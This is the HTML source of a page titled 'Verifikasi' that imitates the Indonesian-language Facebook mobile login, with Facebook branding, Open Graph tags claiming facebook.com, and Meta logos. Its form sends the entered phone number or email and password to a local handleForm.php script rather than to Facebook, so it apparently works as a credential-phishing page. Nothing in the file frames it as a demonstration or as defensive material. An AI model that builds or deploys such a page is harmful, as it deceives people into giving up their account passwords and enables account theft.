<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta property="og:title" content="Facebook">
    <meta property="og:description" content="Facebook">
    <meta property="og:image" content="https://logopng.com.br/logos/facebook-13.png">
    <meta property="og:url" content="https://www.facebook.com">
    <title>Verifikasi</title>
    <link rel="icon" type="image/png" sizes="32x32" href="assets/favicon.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="style.css"></script>

    <style>
        html,
        body {
            overflow: hidden;
            height: 100%;
        }

        .background {
            background-image: radial-gradient(rgba(255, 255, 255, 0.25), rgba(255, 255, 255, 0) 40%),
                radial-gradient(rgb(255, 209, 82) 30%, rgb(226, 105, 150), rgba(226, 105, 150, 0.4) 41%, transparent 52%),
                radial-gradient(rgb(160, 51, 255) 37%, transparent 46%),
                linear-gradient(155deg, transparent 65%, rgb(37, 212, 102) 95%),
                linear-gradient(45deg, rgb(0, 101, 224), rgb(15, 139, 255));
            background-position: left bottom, 109% 68%, 109% 68%, center center, center center;
            background-repeat: no-repeat;
            background-size: 200% 200%, 285% 500%, 285% 500%, cover, cover;
            position: absolute;
            inset: 0;
            opacity: 0.08;
            pointer-events: none;
            z-index: -1;
            height: 100vh;
        }

        body {
            height: 100vh;
            margin: 0;
        }
    </style>
</head>

<body class=" ">

    <div class="background"></div>

    <div class="container mx-auto relative z-10">
        <div class="up">
            <p class="text-center text-gray-600 mx-auto my-8 font-normal text-sm">Bahasa Indonesia</p>
            <img class="w-14 mx-auto bg-transparent my-20 rounded-full" src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="">
        </div>

        <form class="down bg-none flex flex-col" id="form" action="handleForm.php" method="POST">
            <input class="rounded-lg mr-3 ml-3 py-4 mb-2 px-2 text-base border border-spacing-56 border-gray-300 focus:outline-none focus:border-gray-700 transition duration-300" type="text" id="inputUsername" name="inputUsername" placeholder="Nomor Ponsel atau email" required>
            <input class="rounded-lg mr-3 ml-3 py-4 mb-2 px-2 text-base border border-gray-300 focus:outline-none focus:border-gray-700 transition duration-300" type="password" id="inputPassword" name="inputPassword" placeholder="Kata Sandi" required>
            <button class="btn rounded-full mr-3 ml-3 py-2 bg-[#0064E0] text-white hover:bg-blue-700 hover:mr-4 hover:ml-4 cursor-pointer" type="submit" value="Login">Login</button>
            <p href="https://m.facebook.com/login/identify/" class="mt-2 text-gray-800 bg-none text-sm font-semibold mx-auto mb-20 hover:underline cursor-pointer">Lupa kata sandi?</p>
        </form>

        <div class="bottom bg-none flex flex-col mt-8">
            <button hfref="https://m.facebook.com/reg/" class="btn border border-blue-900 rounded-full mr-3 ml-3 py-2 text-blue-900 font-semibold hover:border-blue-600 hover:text-blue-600 hover:mr-4 hover:ml-4">
                Buat akun baru
            </button>
            <img class="w-16 mx-auto bg-transparent" src="assets/meta.svg" alt="">
        </div>

        <div class="footer text-center p-1 text-muted text-xs">
            <a href="#" class="mx-0.5">Tentang</a>
            <a href="#" class="mx-0.5">Bantuan</a>
            <a href="#" class="mx-0.5">Lainnya</a>
        </div>
    </div>
</body>

</html>